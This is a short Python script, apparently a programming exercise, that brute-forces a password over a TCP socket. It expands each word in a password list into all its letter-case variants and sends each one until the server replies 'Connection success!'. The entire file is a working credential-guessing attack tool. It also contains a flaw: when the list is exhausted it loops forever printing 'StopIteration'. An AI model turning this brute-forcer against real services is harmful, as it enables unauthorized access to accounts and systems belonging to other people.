import socket
import sys
import itertools


def yield_variants(file):
    with open(file, 'r') as pw_list:
        for pw in pw_list:
            for variation in \
                    map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in pw.strip('\n')))):
                yield variation


args = sys.argv
ip = str(args[1])
port = int(args[2])
buffer_size = 1024
CONNECTION_SUCCESS = 'Connection success!'

my_socket = socket.socket()
address = (ip, port)
my_socket.connect(address)
passwords = yield_variants('passwords.txt')
while True:
    try:
        password = next(passwords)
        my_socket.send(password.encode())
        response = my_socket.recv(buffer_size)
        if response.decode() == CONNECTION_SUCCESS:
            print(password)
            quit()
    except StopIteration:
        print('StopIteration')
